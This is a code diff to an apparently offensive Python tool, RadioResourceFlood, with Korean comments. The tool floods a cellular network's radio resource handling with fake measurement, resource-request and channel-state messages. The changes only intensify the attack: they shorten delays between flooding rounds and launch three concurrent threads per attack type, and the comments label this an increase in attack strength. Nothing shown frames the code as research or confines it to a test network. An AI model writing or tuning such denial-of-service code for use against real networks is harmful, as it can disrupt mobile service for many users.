@@ -273,7 +273,7 @@ class RadioResourceFlood:
                     
                     time.sleep(0.001)  # 매우 짧은 간격
                 
-                time.sleep(0.1)  # 다음 라운드까지 대기
+                time.sleep(0.01)  # 다음 라운드까지 대기 (강도 증가)
                 
             except Exception as e:
                 print(f"자원 요청 플러딩 오류: {e}")
@@ -297,7 +297,7 @@ class RadioResourceFlood:
                     
                     time.sleep(0.001)  # 매우 짧은 간격
                 
-                time.sleep(0.08)  # 다음 라운드까지 대기
+                time.sleep(0.01)  # 다음 라운드까지 대기 (강도 증가)
                 
             except Exception as e:
                 print(f"채널 상태 플러딩 오류: {e}")
@@ -332,25 +332,28 @@ class RadioResourceFlood:
         self.running = True
         
         if attack_type == "measurement":
-            # 측정 보고 플러딩
-            thread = threading.Thread(target=self.measurement_flooding, args=(num_ues, duration))
-            thread.daemon = True
-            thread.start()
-            self.attack_threads.append(thread)
+            # 측정 보고 플러딩 - 강도 증가
+            for i in range(3):  # 3개 스레드로 동시 공격
+                thread = threading.Thread(target=self.measurement_flooding, args=(num_ues, duration))
+                thread.daemon = True
+                thread.start()
+                self.attack_threads.append(thread)
             
         elif attack_type == "resource":
-            # 자원 요청 플러딩
-            thread = threading.Thread(target=self.resource_request_flooding, args=(num_ues, duration))
-            thread.daemon = True
-            thread.start()
-            self.attack_threads.append(thread)
+            # 자원 요청 플러딩 - 강도 증가
+            for i in range(3):  # 3개 스레드로 동시 공격
+                thread = threading.Thread(target=self.resource_request_flooding, args=(num_ues, duration))
+                thread.daemon = True
+                thread.start()
+                self.attack_threads.append(thread)
             
         elif attack_type == "channel":
-            # 채널 상태 플러딩
-            thread = threading.Thread(target=self.channel_state_flooding, args=(num_ues, duration))
-            thread.daemon = True
-            thread.start()
-            self.attack_threads.append(thread)
+            # 채널 상태 플러딩 - 강도 증가
+            for i in range(3):  # 3개 스레드로 동시 공격
+                thread = threading.Thread(target=self.channel_state_flooding, args=(num_ues, duration))
+                thread.daemon = True
+                thread.start()
+                self.attack_threads.append(thread)
             
         elif attack_type == "mixed":
             # 혼합 공격
